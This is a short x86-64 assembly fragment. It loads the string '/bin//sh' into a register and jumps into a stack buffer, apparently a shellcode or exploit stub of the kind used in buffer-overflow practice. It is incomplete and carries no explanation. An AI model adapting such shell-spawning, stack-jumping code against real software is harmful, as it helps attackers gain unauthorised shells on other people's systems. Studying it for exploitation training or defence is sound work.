global _start
section .text
_start:
        mov rdi, 0x68732f2f6e69622f
        lea rax, [rbp - 0xe0 + 128]
        jmp rax
